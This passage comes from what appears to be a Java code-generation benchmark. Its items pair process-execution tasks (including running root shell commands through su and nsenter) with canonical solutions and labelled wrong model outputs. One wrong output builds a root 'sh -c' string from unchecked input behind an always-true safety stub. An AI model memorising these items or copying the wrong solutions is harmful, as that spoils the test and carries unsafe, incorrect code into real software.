    "Canonical_solution": "import com.linbit.extproc.OutputProxy.Event;\nimport java.io.IOException;\nimport java.lang.ProcessBuilder.Redirect;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler\n{\n    public static final int PROCESS_STOPPED = Integer.MAX_VALUE;\n    private static final byte DELIMITER = '\\n';\n\n    private final ProcessBuilder processBuilder;\n    private Process process;\n\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n\n    private final BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(final BlockingDeque<Event> dequeRef, final String... command)\n    {\n        deque = dequeRef;\n        processBuilder = new ProcessBuilder(command);\n        processBuilder.redirectError(Redirect.PIPE);\n        stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOutRef)\n    {\n        stdOut = stdOutRef;\n    }\n\n    public Process startDelimited() throws IOException\n    {\n        return startDelimited(DELIMITER);\n    }\n\n    public Process startDelimited(byte delimiterRef) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxyDelimited(process.getErrorStream(), deque, delimiterRef, false);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxyDelimited(process.getInputStream(), deque, delimiterRef, true);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException\n    {\n        return startUndelimited(OutputProxy.DFLT_BUFFER_SIZE);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException\n    {\n        stop(true);\n\n        process = processBuilder.start();\n        errProxy = new OutputProxy(process.getErrorStream(), deque, false, bufferSize);\n        errThread = new Thread(errProxy);\n        if (stdOut)\n        {\n            outProxy = new OutputProxy(process.getInputStream(), deque, true, bufferSize);\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force)\n    {\n        if (process != null)\n        {\n            if (outProxy != null)\n            {\n                outProxy.expectShutdown();\n            }\n            errProxy.expectShutdown();\n            if (force)\n            {\n                process.destroyForcibly();\n            }\n            else\n            {\n                process.destroy();\n            }\n            if (outThread != null)\n            {\n                outThread.interrupt();\n            }\n            errThread.interrupt();\n            process = null;\n        }\n    }\n\n    public int getExitCode()\n    {\n        int exitValue;\n        Process proc = process;\n        if (proc != null)\n        {\n            if (proc.isAlive())\n            {\n                try\n                {\n                    proc.waitFor(500, TimeUnit.MILLISECONDS);\n                }\n                catch (InterruptedException ignored)\n                {\n                }\n                if (proc.isAlive())\n                {\n                    throw new ImplementationError(\"Process is still running\");\n                }\n            }\n            exitValue = proc.exitValue();\n        }\n        else\n        {\n            exitValue = PROCESS_STOPPED;\n        }\n        return exitValue;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.concurrent.BlockingDeque;\nimport java.util.concurrent.TimeUnit;\n\npublic class DaemonHandler {\n    public static final int PROCESS_STOPPED = -1;\n    private ProcessBuilder processBuilder;\n    private Process process;\n    private Thread outThread;\n    private Thread errThread;\n    private OutputProxy errProxy;\n    private OutputProxy outProxy;\n    private BlockingDeque<Event> deque;\n    private boolean stdOut;\n\n    public DaemonHandler(BlockingDeque<Event> deque, String... command) {\n        this.deque = deque;\n        this.processBuilder = new ProcessBuilder(command);\n        this.stdOut = true;\n    }\n\n    public void setStdOutListener(boolean stdOut) {\n        this.stdOut = stdOut;\n    }\n\n    public Process startDelimited() throws IOException {\n        return startDelimited((byte) '\\n');\n    }\n\n    public Process startDelimited(byte delimiter) throws IOException {\n        process = processBuilder.start();\n        if (stdOut) {\n            outProxy = new OutputProxy(process.getInputStream(), delimiter, \"STDOUT\");\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errProxy = new OutputProxy(process.getErrorStream(), delimiter, \"STDERR\");\n        errThread = new Thread(errProxy);\n        errThread.start();\n        return process;\n    }\n\n    public Process startUndelimited() throws IOException {\n        return startUndelimited(1024);\n    }\n\n    public Process startUndelimited(int bufferSize) throws IOException {\n        process = processBuilder.start();\n        if (stdOut) {\n            outProxy = new OutputProxy(process.getInputStream(), bufferSize, \"STDOUT\");\n            outThread = new Thread(outProxy);\n            outThread.start();\n        }\n        errProxy = new OutputProxy(process.getErrorStream(), bufferSize, \"STDERR\");\n        errThread = new Thread(errProxy);\n        errThread.start();\n        return process;\n    }\n\n    public void stop(boolean force) {\n        if (process != null) {\n            if (force) {\n                process.destroyForcibly();\n            } else {\n                process.destroy();\n            }\n            try {\n                if (outThread != null && outThread.isAlive()) {\n                    outThread.join(500);\n                }\n                if (errThread != null && errThread.isAlive()) {\n                    errThread.join(500);\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public int getExitCode() {\n        if (process == null || process.isAlive()) {\n            return PROCESS_STOPPED;\n        }\n        try {\n            return process.exitValue();\n        } catch (IllegalThreadStateException e) {\n            return PROCESS_STOPPED;\n        }\n    }\n\n    private class OutputProxy implements Runnable {\n        private InputStream inputStream;\n        private byte delimiter;\n        private int bufferSize;\n        private String streamType;\n\n        public OutputProxy(InputStream inputStream, byte delimiter, String streamType) {\n            this.inputStream = inputStream;\n            this.delimiter = delimiter;\n            this.streamType = streamType;\n        }\n\n        public OutputProxy(InputStream inputStream, int bufferSize, String streamType) {\n            this.inputStream = inputStream;\n            this.bufferSize = bufferSize;\n            this.streamType = streamType;\n        }\n\n        @Override\n        public void run() {\n            byte[] buffer = new byte[bufferSize];\n            int bytesRead;\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            boolean delimited = delimiter != 0;\n\n            try {\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n\n                    if (delimited) {\n                        int index = 0;\n                        while ((index = findDelimiter(baos.toByteArray(), delimiter, index)) != -1) {\n                            int length = index + 1;\n                            byte[] chunk = new byte[length];\n                            System.arraycopy(baos.toByteArray(), 0, chunk, 0, length);\n                            Event event = new Event(streamType, chunk);\n                            deque.put(event);\n                            baos.reset();\n                            index++;\n                        }\n                    } else {\n                        byte[] data = baos.toByteArray();\n                        Event event = new Event(streamType, data);\n                        deque.put(event);\n                        baos.reset();\n                    }\n                }\n\n                if (baos.size() > 0) {\n                    Event event = new Event(streamType, baos.toByteArray());\n                    deque.put(event);\n                }\n            } catch (IOException | InterruptedException e) {\n                Thread.currentThread().interrupt();\n            } finally {\n                try {\n                    inputStream.close();\n                } catch (IOException ignored) {\n                }\n            }\n        }\n\n        private int findDelimiter(byte[] data, byte delimiter, int startIndex) {\n            for (int i = startIndex; i < data.length; i++) {\n                if (data[i] == delimiter) {\n                    return i;\n                }\n            }\n            return -1;\n        }\n    }\n\n    public static class Event {\n        private final String type;\n        private final byte[] data;\n\n        public Event(String type, byte[] data) {\n            this.type = type;\n            this.data = data;\n        }\n\n        public String getType() {\n            return type;\n        }\n\n        public byte[] getData() {\n            return data;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a Java function that executes a shell command with root privileges using ProcessBuilder, handles input/output streams, and properly manages process lifecycle and error handling.\n\nFunction Description: The function executes a given shell command with root privileges by spawning a new process through ProcessBuilder. It uses 'su' to gain root access and 'nsenter' to enter the root namespace. The function handles command safety checks, process I/O streams, error redirection, and proper resource cleanup. It returns the command output or error messages.\n\nInput: \n- cmd: String - The shell command to be executed with root privileges\n\nOutput: \n- String - The output of the executed command (stdout) or error message if execution fails. The output string is cleaned to remove trailing newlines and unnecessary error prefixes.\n\nNote: The function includes a safety check (isSafeCommand) to prevent dangerous operations, though its implementation isn't shown in the reference code.",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic static String rootExecCmd(String cmd) {\n    if (!isSafeCommand(cmd)) return \"Cannot exec this command: Dangerous operation\";\n    StringBuilder result = new StringBuilder();\n    ProcessBuilder pb = new ProcessBuilder(\"su\");\n    Process p;\n    DataOutputStream dos = null;\n    DataInputStream dis = null;\n    try {\n        pb.redirectErrorStream(true);\n        p = pb.start();\n        dos = new DataOutputStream(p.getOutputStream());\n        dis = new DataInputStream(p.getInputStream());\n        dos.writeBytes(\"nsenter --mount=/proc/1/ns/mnt -- \" + cmd + \"\\n\");\n        dos.flush();\n        dos.writeBytes(\"exit\\n\");\n        dos.flush();\n        String line;\n        while ((line = dis.readLine()) != null) {\n            result.append(line).append(\"\\n\");\n        }\n        p.waitFor();\n    } catch (Exception e) {\n        if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n            return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n        } else {\n            return String.valueOf(e);\n        }\n    } finally {\n        if (dos != null) {\n            try {\n                dos.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n        if (dis != null) {\n            try {\n                dis.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n    }\n    if (result.length() > 0) {\n        result = new StringBuilder(result.substring(0, result.length() - 1));\n    }\n    if (!cmd.contains(\"nsenter\") && result.toString().contains(\"nsenter: exec \")) {\n        return result.toString().replace(\"nsenter: exec \", \"\");\n    } else {\n        return result.toString();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic class RootCommandExecutor {\n\n    public static String executeRootCommand(String cmd) {\n        if (cmd == null || cmd.isEmpty()) {\n            return \"Error: Command cannot be null or empty.\";\n        }\n\n        if (!isSafeCommand(cmd)) {\n            return \"Error: Command is not allowed for security reasons.\";\n        }\n\n        Process process = null;\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(\"su\", \"-\", \"root\", \"-c\", \"nsenter -t 1 -m -u -n -i sh -c \\\"\" + cmd + \"\\\"\");\n            processBuilder.redirectErrorStream(true);\n            process = processBuilder.start();\n\n            StringBuilder output = new StringBuilder();\n            java.io.InputStream inputStream = process.getInputStream();\n            byte[] buffer = new byte[1024];\n            int length;\n\n            while ((length = inputStream.read(buffer)) != -1) {\n                output.append(new String(buffer, 0, length));\n            }\n\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                return \"Error executing command: \" + output.toString().trim();\n            }\n\n            String result = output.toString().trim();\n            if (result.endsWith(\"\\n\")) {\n                result = result.substring(0, result.length() - 1);\n            }\n            return result;\n\n        } catch (Exception e) {\n            return \"Exception: \" + e.getMessage();\n\n        } finally {\n            if (process != null) {\n                process.destroy();\n            }\n        }\n    }\n\n    private static boolean isSafeCommand(String cmd) {\n        // Placeholder for actual safety checks\n        return true;\n    }\n}\n```"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that executes an external process, captures its output (including error streams redirected to standard output), and returns the output as a string.\n\nFunction Description: The function uses Java's ProcessBuilder to start an external process specified by the given command. It redirects the error stream to the standard output stream to capture all output in one place. The function reads the process's output stream line by line, collects it into a string, and waits for the process to complete before returning the collected output.\n\nInput: \n- cmd: String[] - An array of strings representing the command to execute and its arguments.\n\nOutput: \n- String - The combined standard output and error output of the executed process, trimmed of any leading or trailing whitespace.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getProcessOutput(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder processOutput = new StringBuilder();\n    try (BufferedReader processOutputReader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));) {\n        String readLine;\n        while ((readLine = processOutputReader.readLine()) != null) {\n            processOutput.append(readLine + System.lineSeparator());\n        }\n        process.waitFor();\n    }\n    return processOutput.toString().trim();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic static String executeProcess(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder output = new StringBuilder();\n    try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(System.lineSeparator());\n        }\n    }\n    process.waitFor();\n    return output.toString().trim();\n}\n```"
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: Create a Java function that executes an external process using ProcessBuilder, captures its output, and handles errors appropriately.\n\nFunction Description: The function executes a shell command constructed from configuration parameters, captures the process's standard output and error streams (merged), waits for the process to complete, and returns the exit status or throws an exception if the process fails. The function handles process initialization, stream reading, and error management.\n\nInput:\n- job: Job<Object> - A job object containing configuration details\n- parameters: Map<String, Object> - A map of parameters used to construct the shell command\n\nOutput:\n- Object - Returns 0 if the process exits successfully, otherwise throws a HugeException containing the exit code and process output\n\nNote: The function includes error handling for process initialization, execution, and stream reading, with all exceptions wrapped in HugeException. The process's working directory is set to executeDir(), and error streams are redirected to standard output.",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStreamReader;\nimport java.io.LineNumberReader;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic Object call(Job<Object> job, Map<String, Object> parameters) {\n    this.checkAndCollectParameters(parameters);\n    try {\n        this.initializeConfig((ComputerJob) job);\n    } catch (Exception e) {\n        throw new HugeException(\n                \"Failed to initialize computer config file\", e);\n    }\n\n    Map<String, Object> configs = new HashMap<>();\n    configs.putAll(this.commonConfig);\n    configs.putAll(this.checkAndCollectParameters(parameters));\n\n    String[] command = this.constructShellCommands(configs);\n    LOG.info(\"Execute computer job: {}\", String.join(SPACE, command));\n\n    try {\n        ProcessBuilder builder = new ProcessBuilder(command);\n        builder.redirectErrorStream(true);\n        builder.directory(new File(executeDir()));\n\n        Process process = builder.start();\n\n        StringBuilder output = new StringBuilder();\n        try (LineNumberReader reader = new LineNumberReader(\n                new InputStreamReader(\n                        process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return 0;\n        }\n\n        throw new HugeException(\"The computer job exit with code %s: %s\",\n                                exitCode, output);\n    } catch (HugeException e) {\n        throw e;\n    } catch (Throwable e) {\n        throw new HugeException(\"Failed to execute computer job\", e);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic Object executeProcess(Job<Object> job, Map<String, Object> parameters) throws HugeException {\n    try {\n        String command = buildCommand(job, parameters);\n        ProcessBuilder processBuilder = new ProcessBuilder(command.split(\" \"));\n        processBuilder.directory(new File(executeDir()));\n        processBuilder.redirectErrorStream(true);\n\n        Process process = processBuilder.start();\n        StringBuilder output = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new HugeException(\"Process failed with exit code \" + exitCode + \". Output: \" + output.toString(), exitCode);\n        }\n\n        return 0;\n    } catch (IOException | InterruptedException e) {\n        throw new HugeException(\"Failed to execute process. Error: \" + e.getMessage(), -1, e);\n    }\n}\n```"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that retrieves the version of the Java compiler installed on the system by executing the 'javac -version' command and capturing its output.\n\nFunction Description: The function uses Java's ProcessBuilder to launch an external process running the 'javac -version' command. It captures the command's output (which is redirected from stderr to stdout), reads the first line of output, and returns it as the version string. If any errors occur during this process, the function returns \"unknown\".\n\nInput: None (The function takes no input parameters)\n\nOutput: String - Returns the version string output by the 'javac -version' command (e.g., \"javac 1.8.0_291\"), or \"unknown\" if an error occurs during execution.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.lang.ProcessBuilder;\n\nprivate String getJavaCompilerVersion() {\n    ProcessBuilder pb = new ProcessBuilder(\"javac\", \"-version\");\n    pb.redirectErrorStream(true);\n\n    BufferedReader in = null;\n    try {\n        Process process = pb.start();\n        in = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String buffer = in.readLine();\n        process.waitFor();\n        return buffer;\n    } catch (Exception e) {\n        return \"unknown\";\n    } finally {\n        if (in != null) {\n            try {\n                in.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\npublic class JavaVersionChecker {\n    public static String getJavaCompilerVersion() {\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(\"javac\", \"-version\");\n            processBuilder.redirectErrorStream(true);\n            Process process = processBuilder.start();\n            java.util.Scanner scanner = new java.util.Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n            String output = scanner.hasNext() ? scanner.next() : \"\";\n            scanner.close();\n            process.waitFor();\n            if (!output.isEmpty()) {\n                return output.trim();\n            }\n        } catch (Exception e) {\n            // Ignore exceptions and return \"unknown\"\n        }\n        return \"unknown\";\n    }\n}\n```"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Create a Java class that manages an interactive shell process (either regular or root) with proper stream handling, command execution, and event notification capabilities.\n\nClass Description: The ShellStream class provides an interface to execute commands in a shell process (sh or su) while managing input/output streams and notifying listeners about process events. It handles command execution synchronization, stream monitoring, and process lifecycle management.\n\nAttributes:\n- mConnection: Process - The running shell process instance\n- mStdInput: DataOutputStream - Stream for writing commands to the process\n- mStdOutput: BufferedReader - Stream for reading process output\n- mStdOutputWorker: Thread - Worker thread for monitoring output stream\n- mListener: OnStreamListener - Callback interface for process events\n- mCounter: Counter - Thread-safe counter for active commands\n- mLock: Object - Synchronization lock object\n- mIsActive: Boolean - Flag indicating if the process is active\n- mIsRoot: Boolean - Flag indicating if using root shell (su)\n- mCommandEnd: String - Unique marker for command termination\n\nMethods:\n- ShellStream(Boolean requestRoot, OnStreamListener listener) -> void - Constructor that initializes the shell process (root or regular) and sets up stream handlers\n- execute(String command) -> void - Executes a shell command asynchronously and tracks its completion\n- waitFor() -> Boolean - Waits indefinitely for all commands to complete\n- waitFor(Integer timeout) -> Boolean - Waits with timeout for all commands to complete\n- waitFor(Integer timeout, Integer index) -> Boolean - Internal wait method with timeout and counter adjustment\n- isActive() -> Boolean - Returns if the shell process is active\n- isRunning() -> Boolean - Returns if any commands are currently executing\n- isRoot() -> Boolean - Returns if using root shell\n- destroy() -> void - Cleanly terminates the shell process and releases resources\n\nNested Interfaces:\n- OnStreamListener: Interface for process event callbacks\n  - onStreamStart(): Notifies when command execution starts\n  - onStreamInput(String): Provides process output lines\n  - onStreamStop(Integer): Notifies when command completes with exit code\n  - onStreamDied(): Notifies when process terminates unexpectedly\n\nNested Classes:\n- Counter: Thread-safe counter implementation\n  - size() -> Integer: Gets current count\n  - encrease() -> Integer: Increments counter\n  - decrease() -> Integer: Decrements counter\n  - reset() -> void: Resets counter to zero",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport android.util.Log;\n\npublic class ShellStream {\n    public static final String TAG = Common.TAG + \".ShellStream\";\n    \n    protected Process mConnection;\n    protected DataOutputStream mStdInput;\n    protected BufferedReader mStdOutput;\n    protected Thread mStdOutputWorker;\n    protected OnStreamListener mListener;\n    protected final Counter mCounter = new Counter();\n    protected final Object mLock = new Object();\n    protected Boolean mIsActive = false;\n    protected Boolean mIsRoot = false;\n    protected String mCommandEnd = \"EOL:a00c38d8:EOL\";\n    \n    protected static class Counter {\n        private volatile Integer mCount = 0;\n        private volatile Object mLock = new Object();\n        \n        public Integer size() {\n            synchronized(mLock) {\n                return mCount;\n            }\n        }\n        \n        public Integer encrease() {\n            synchronized(mLock) {\n                return (mCount += 1);\n            }\n        }\n        \n        public Integer decrease() {\n            synchronized(mLock) {\n                return mCount > 0 ? (mCount -= 1) : (mCount = 0);\n            }\n        }\n        \n        public void reset() {\n            synchronized(mLock) {\n                mCount = 0;\n            }\n        }\n    }\n    \n    public static interface OnStreamListener {\n        public void onStreamStart();\n        public void onStreamInput(String outputLine);\n        public void onStreamStop(Integer resultCode);\n        public void onStreamDied();\n    }\n    \n    public ShellStream(Boolean requestRoot, OnStreamListener listener) {\n        try {\n            if(Common.DEBUG)Log.d(TAG, \"Construct: Establishing a new shell stream\");\n            \n            ProcessBuilder builder = new ProcessBuilder(requestRoot ? \"su\" : \"sh\");\n            builder.redirectErrorStream(true);\n            \n            mIsRoot = requestRoot;\n            mIsActive = true;\n            mListener = listener;\n            mConnection = builder.start();\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            \n            mStdOutputWorker = new Thread() {\n                @Override\n                public void run() {\n                    String output = null;\n                    \n                    try {\n                        while (mIsActive && (output = mStdOutput.readLine()) != null) {\n                            if (mListener != null && mCounter.size() > 0) {\n                                if (output.contains(mCommandEnd)) {\n                                    Integer result = 0;\n                                    \n                                    try {\n                                        if (output.startsWith(mCommandEnd)) {\n                                            result = Integer.parseInt(output.substring(mCommandEnd.length()+1));\n                                            \n                                        } else {\n                                            result = 1;\n                                        }\n                                        \n                                    } catch (Throwable e) {\n                                        Log.w(TAG, e.getMessage(), e);\n                                    }\n                                    \n                                    mListener.onStreamStop(result);\n                                    mCounter.decrease();\n                                    \n                                    synchronized(mLock) {\n                                        mLock.notifyAll();\n                                    }\n                                    \n                                } else {\n                                    mListener.onStreamInput(output);\n                                }\n                            }\n                        }\n                        \n                    } catch (IOException e) {\n                        Log.w(TAG, e.getMessage(), e); output = null;\n                    }\n                    \n                    if (output == null) {\n                        ShellStream.this.destroy();\n                    }\n                }\n            };\n            \n            mStdOutputWorker.start();\n            \n        } catch (IOException e) {\n            Log.w(TAG, e.getMessage(), e); mIsActive = false;\n        }\n    }\n    \n    public synchronized void execute(final String command) {\n        final Object lock = new Object();\n        \n        new Thread() {\n            @Override\n            public void run() {\n                mCounter.encrease();\n                \n                synchronized(lock) {\n                    lock.notifyAll();\n                }\n                \n                synchronized(mLock) {\n                    if (waitFor(0, -1)) {\n                        mListener.onStreamStart();\n                        \n                        String input = command + \"\\n\";\n                        input += \"    echo \" + mCommandEnd + \" $?\\n\";\n                        \n                        try {\n                            mStdInput.write( input.getBytes() );\n                            \n                            if (mStdInput != null) {\n                                mStdInput.flush();\n                            }\n                            \n                        } catch (IOException e) {\n                            Log.w(TAG, e.getMessage(), e);\n                        }\n                    }\n                }\n            }\n            \n        }.start();\n        \n        synchronized (lock) {\n            try {\n                lock.wait();\n                \n            } catch (InterruptedException e) {}\n        }\n    }\n    \n    public Boolean waitFor() {\n        return waitFor(0, 0);\n    }\n    \n    public Boolean waitFor(Integer timeout) {\n        return waitFor(timeout, 0);\n    }\n    \n    protected Boolean waitFor(Integer timeout, Integer index) {\n        Integer counter = mCounter.size()+index;\n        \n        if (counter > 0) {\n            Long timeoutMilis = timeout > 0 ? System.currentTimeMillis() + timeout : 0L;\n            \n            synchronized(mLock) {\n                while (mCounter.size() > 0 && mIsActive) {\n                    try {\n                        counter -= 1;\n                        \n                        mLock.wait(timeout.longValue());\n                        \n                        if (timeout > 0 && System.currentTimeMillis() >= timeoutMilis) {\n                            return mCounter.size() == 0 && mIsActive;\n                            \n                        } else if (counter <= 0) {\n                            return mIsActive;\n                        }\n                        \n                    } catch (InterruptedException e) {\n                        Log.w(TAG, e.getMessage(), e);\n                    }\n                }\n            }\n        }\n        \n        return mIsActive;\n    }\n    \n    public Boolean isActive() {\n        return mIsActive;\n    }\n    \n    public Boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n    \n    public Boolean isRoot() {\n        return mIsRoot;\n    }\n    \n    public synchronized void destroy() {\n        if (mStdInput != null) {\n            mIsActive = false;\n            \n            mCounter.reset();\n            \n            try {\n                mStdInput.close();\n                mStdInput = null;\n                \n            } catch (IOException e) {}\n            \n            mStdOutputWorker.interrupt();\n            mStdOutputWorker = null;\n            \n            synchronized (mLock) {\n                mLock.notifyAll();\n            }\n            \n            mListener.onStreamDied();\n            mListener = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "```java\nimport java.io.*;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class ShellStream {\n    private Process mConnection;\n    private DataOutputStream mStdInput;\n    private BufferedReader mStdOutput;\n    private Thread mStdOutputWorker;\n    private OnStreamListener mListener;\n    private Counter mCounter;\n    private final Object mLock = new Object();\n    private boolean mIsActive;\n    private boolean mIsRoot;\n    private static final String mCommandEnd = \"###COMMAND_END###\";\n\n    public interface OnStreamListener {\n        void onStreamStart();\n        void onStreamInput(String line);\n        void onStreamStop(int exitCode);\n        void onStreamDied();\n    }\n\n    public static class Counter {\n        private AtomicInteger count = new AtomicInteger(0);\n\n        public int size() {\n            return count.get();\n        }\n\n        public int encrease() {\n            return count.incrementAndGet();\n        }\n\n        public int decrease() {\n            return count.decrementAndGet();\n        }\n\n        public void reset() {\n            count.set(0);\n        }\n    }\n\n    public ShellStream(boolean requestRoot, OnStreamListener listener) {\n        mListener = listener;\n        mIsRoot = requestRoot;\n        try {\n            if (mIsRoot) {\n                mConnection = Runtime.getRuntime().exec(\"su\");\n            } else {\n                mConnection = Runtime.getRuntime().exec(\"sh\");\n            }\n            mStdInput = new DataOutputStream(mConnection.getOutputStream());\n            mStdOutput = new BufferedReader(new InputStreamReader(mConnection.getInputStream()));\n            mCounter = new Counter();\n            mIsActive = true;\n\n            mStdOutputWorker = new Thread(() -> {\n                try {\n                    String line;\n                    while ((line = mStdOutput.readLine()) != null) {\n                        if (line.contains(mCommandEnd)) {\n                            String[] parts = line.split(\"\\\\$\\\\$\\\\$COMMAND_END\\\\$\\\\$\\\\$\", 2);\n                            if (parts.length == 2) {\n                                int index = Integer.parseInt(parts[0]);\n                                synchronized (mLock) {\n                                    mCounter.decrease();\n                                    mListener.onStreamStop(index);\n                                }\n                            }\n                        } else {\n                            mListener.onStreamInput(line);\n                        }\n                    }\n                } catch (IOException e) {\n                    mListener.onStreamDied();\n                } finally {\n                    mIsActive = false;\n                }\n            });\n            mStdOutputWorker.start();\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public void execute(String command) {\n        if (!mIsActive) return;\n        try {\n            mListener.onStreamStart();\n            int index = mCounter.encrease();\n            String cmdWithMarker = command + \"\\necho $\" + mCommandEnd + \"$\" + index + \"$\";\n            mStdInput.writeBytes(cmdWithMarker + \"\\n\");\n            mStdInput.flush();\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n\n    public boolean waitFor() {\n        return waitFor(-1);\n    }\n\n    public boolean waitFor(int timeout) {\n        return waitFor(timeout, 0);\n    }\n\n    private boolean waitFor(int timeout, int index) {\n        long startTime = System.currentTimeMillis();\n        while (true) {\n            synchronized (mLock) {\n                if (mCounter.size() <= index) {\n                    return true;\n                }\n            }\n            if (timeout > 0 && System.currentTimeMillis() - startTime > timeout) {\n                return false;\n            }\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                return false;\n            }\n        }\n    }\n\n    public boolean isActive() {\n        return mIsActive;\n    }\n\n    public boolean isRunning() {\n        return mCounter.size() > 0;\n    }\n\n    public boolean isRoot() {\n        return mIsRoot;\n    }\n\n    public void destroy() {\n        try {\n            if (mConnection != null) {\n                mConnection.destroy();\n            }\n            if (mStdInput != null) {\n                mStdInput.close();\n            }\n            if (mStdOutput != null) {\n                mStdOutput.close();\n            }\n            if (mStdOutputWorker != null && mStdOutputWorker.isAlive()) {\n                mStdOutputWorker.interrupt();\n            }\n            mCounter.reset();\n            mIsActive = false;\n        } catch (IOException e) {\n            mListener.onStreamDied();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: The task involves creating a Java utility class that manages environment variables for a Java Runtime Environment (JRE) and handles log redirection from an external process. The class should provide methods to configure the JRE environment and redirect logs from the Android `logcat` command to a custom logger.\n\nClass Description: This utility class is designed to set up the JRE environment by configuring various system environment variables and redirecting logs from an external process (`logcat`) to a custom logger. It is particularly useful for Android applications that need to manage JRE environments and log outputs dynamically.\n\nAttributes:\n\n- `NATIVE_LIB_DIR`: String - The directory path for native libraries.\n- `LD_LIBRARY_PATH`: String - The library path for dynamic linking.\n- `LOCAL_RENDERER`: String - The renderer type for graphics (e.g., \"opengles3_desktopgl_angle_vulkan\").\n- `jvmLibraryPath`: String - The path to the JVM library (e.g., \"server/libjvm.so\" or \"client/libjvm.so\").\n- `logcatPb`: ProcessBuilder - A ProcessBuilder instance for executing the `logcat` command.\n- `failTime`: int - A counter to track the number of failed attempts to start the `logcat` process.\n\nMethods:\n\n- `redirectAndPrintJRELog()`: void - Starts a new thread to redirect and print JRE logs from the `logcat` command. The method configures the `logcat` command to filter specific log tags and redirects the output to a custom logger. If the process fails, it retries up to 10 times.\n- `setJavaEnvironment(Activity activity, String jreHome)`: void - Configures the JRE environment by setting various system environment variables. The method reads additional environment 